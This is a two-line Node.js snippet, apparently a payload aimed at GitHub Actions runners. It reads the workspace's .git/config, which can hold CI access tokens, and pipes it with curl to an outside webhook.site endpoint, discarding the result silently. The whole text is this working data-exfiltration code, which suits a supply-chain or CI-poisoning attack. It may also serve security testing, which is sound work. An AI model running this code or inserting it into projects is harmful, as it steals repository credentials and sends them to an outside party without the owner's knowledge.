const { exec } = require('child_process');
exec('cat $GITHUB_WORKSPACE/.git/config | curl -X POST https://webhook.site/TestActions/TestAdobe1/ -d @-', () => {});
